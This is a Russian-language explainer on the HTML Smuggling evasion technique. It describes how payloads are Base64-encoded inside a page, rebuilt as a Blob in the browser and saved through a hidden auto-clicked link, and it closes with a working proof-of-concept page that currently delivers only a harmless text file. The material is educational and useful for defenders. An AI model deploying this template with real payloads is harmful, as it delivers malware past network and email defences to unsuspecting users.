## 1. Введение и суть техники

**HTML Smuggling** ([T1027.006](https://attack.mitre.org/techniques/T1027/006/)) — это техника скрытной доставки файлов на устройство пользователя, при которой итоговый файл не загружается по прямому сетевому URL-адресу, а динамически конструируется на стороне клиента (в памяти браузера) с использованием стандартных возможностей HTML5 и JavaScript.

### Основные причины возникновения и популярности техники:

- **Обход статического сетевого анализа**: Традиционные средства защиты (Network Firewalls, Secure Email Gateways, IPS) анализируют входящий сетевой трафик. При использовании HTML Smuggling через сеть передается только легитимный HTML-документ со стандартными скриптами и зашифрованной/Base64-кодированной строкой.
- **Отсутствие прямого скачивания по сети**: В сетевых логах отсутствует факт передачи исполняемого файла или архива с внешнего сервера.
- **Использование стандартных браузерных API**: Техника опирается на официальные спецификации W3C (HTML5 Blob, Data URL, JavaScript TypedArrays), которые присутствуют во всех современных веб-браузерах.

---

## 2. Механизм работы

Процесс HTML Smuggling состоит из четырех ключевых этапов:

1. **Хранение данных**: Полезная нагрузка (документ, архив или исполняемый файл) кодируется в Base64 (или шифруется алгоритмами XOR/AES) и помещается внутрь переменной JavaScript в HTML-документе.
2. **Декодирование**: При открытии страницы в браузере JavaScript-скрипт декодирует строку в массив байтов (`Uint8Array`).
3. **Сборка объекта в памяти**: Скрипт вызывает конструктор `new Blob([bytes], {type: "application/octet-stream"})`, создавая виртуальный файл в оперативной памяти (RAM) браузера.
4. **Инициирование скачивания**:
    - Создается временная локальная ссылка через `URL.createObjectURL(blob)` (вида `blob:http://...`) или Data URL.
    - Создается DOM-элемент ссылки `<a download="filename">`.
    - Вызывается программный клик `.click()`, побуждающий браузер сохранить файл из памяти на локальный диск пользователя.

---

## 3. Концептуальное воспроизведение (Учебный PoC)

Ниже приведен безопасный демонстрационный шаблон HTML-страницы, формирующий текстовый файл `payload_from_html.txt` прямо из оперативной памяти браузера.

![](<data/Pasted image 20260907201039.png>)

```html
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>HTML Smuggling PoC</title>
</head>
<body>
    <h2>Демонстрация техники HTML Smuggling</h2>
    <p>Файл формируется в памяти браузера и автоматически скачивается на диск.</p>

    <script>
        const base64Payload = "SGVsbG8sIHRoaXMgaXMgYSB0ZXN0IHBheWxvYWQgZGVsaXZlcmVkIHZpYSBIVE1MIFNtdWdnbGluZyE=";
        const targetFilename = "payload_from_html.txt";
        const mimeType = "application/octet-stream";

        function base64ToBytes(base64) {
            const binaryString = atob(base64);
            const len = binaryString.length;
            const bytes = new Uint8Array(len);
            for (let i = 0; i < len; i++) {
                bytes[i] = binaryString.charCodeAt(i);
            }
            return bytes;
        }

        window.addEventListener('DOMContentLoaded', () => {
            const byteArray = base64ToBytes(base64Payload);
			
            const fileBlob = new Blob([byteArray], { type: mimeType });

            const blobUrl = URL.createObjectURL(fileBlob);

            const hiddenLink = document.createElement("a");
            hiddenLink.href = blobUrl;
            hiddenLink.download = targetFilename;
            hiddenLink.style.display = "none";
            document.body.appendChild(hiddenLink);

            hiddenLink.click();

            document.body.removeChild(hiddenLink);
            setTimeout(() => URL.revokeObjectURL(blobUrl), 1000);
        });
    </script>
</body>
</html>
```
